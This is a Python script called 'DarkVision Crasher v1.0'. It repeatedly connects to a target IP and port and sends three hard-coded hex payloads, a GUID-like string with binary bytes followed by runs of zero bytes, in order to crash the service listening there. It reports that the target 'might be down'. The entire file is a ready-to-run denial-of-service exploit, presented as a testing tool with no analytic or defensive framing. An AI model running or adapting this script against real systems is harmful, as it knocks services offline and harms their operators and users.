import socket
import time
import argparse
from datetime import datetime

def create_banner():
    banner = """
+----------------------------------+
|      DarkVision Crasher v1.0     |
|            @01Xyris              |
+----------------------------------+
"""
    return banner

def log_message(message, message_type="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if message_type == "ERROR":
        prefix = "[!]"
    elif message_type == "SUCCESS":
        prefix = "[+]"
    elif message_type == "SENDING":
        prefix = "[>]"
    elif message_type == "RECEIVING":
        prefix = "[<]"
    else:
        prefix = "[*]"
    
    print(f"[{timestamp}] {prefix} {message}")

def send_and_receive(sock, data, description=""):
    log_message(f"Sending: {description}", "SENDING")
    try:
        sock.send(data)
        sock.settimeout(5)
        response = sock.recv(1024)
        log_message(f"Response for {description}:", "RECEIVING")
        print("+" + "-" * 50)
        print("| Hex: " + response.hex())
        try:
            ascii_repr = response.decode('ascii', errors='replace')
            print("| ASCII: " + ''.join(c if c.isprintable() else '.' for c in ascii_repr))
        except UnicodeDecodeError:
            print("| ASCII: Unable to decode response")
        print("+" + "-" * 50)
        return response
    except socket.timeout:
        log_message(f"No response for {description}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error: {str(e)}", "ERROR")
        return None

def main():
    parser = argparse.ArgumentParser(description='DarkVision Crasher - Network Testing Tool')
    parser.add_argument('--ip', default='127.0.0.1', help='Server IP address')
    parser.add_argument('--port', type=int, default=5555, help='Server port')
    parser.add_argument('--iterations', type=int, default=1000, help='Number of iterations')
    args = parser.parse_args()

    print(create_banner())
    log_message(f"Target: {args.ip}:{args.port}")
    log_message(f"Iterations: {args.iterations}")

    payloads = [
        bytes.fromhex(  # Payload 3
            "7b42364431414130462d303643302d343338442d394133462d3841424537434436453444387d000f037584c99e7fd4f4f8c59550f8f50700"
        ),
        bytes.fromhex(  # Payload 4
            "00000000"
        ),
        bytes.fromhex(  # Payload 5
            "0000000000000000"
        ),
    ]
    
    for i in range(args.iterations):
        progress = f"[{i + 1}/{args.iterations}]"
        log_message(f"Starting iteration {progress}")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                log_message("Attempting connection...")
                s.connect((args.ip, args.port))
                log_message("Connected successfully", "SUCCESS")
                
                response = send_and_receive(s, payloads[0], description="Payload 3")
                if not response:
                    log_message("No response for Payload 3. Stopping.", "ERROR")
                    break
                
                send_and_receive(s, payloads[1], description="Payload 4")
                
                send_and_receive(s, payloads[2], description="Payload 5")
                
                time.sleep(0.1)
                
        except ConnectionRefusedError:
            log_message("Connection refused. Target is down or unreachable.", "ERROR")
            break
        except Exception as e:
            log_message(f"Fatal connection error: {str(e)}", "ERROR")
            break

    log_message("Program finished. Target might be down.", "SUCCESS")
    print("\n" + "=" * 50)
    print("               EXECUTION COMPLETE")
    print("=" * 50)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_message("Program terminated by user", "INFO")
        print("\n" + "=" * 50)
        print("               EXECUTION COMPLETE")
        print("=" * 50)
        exit(0)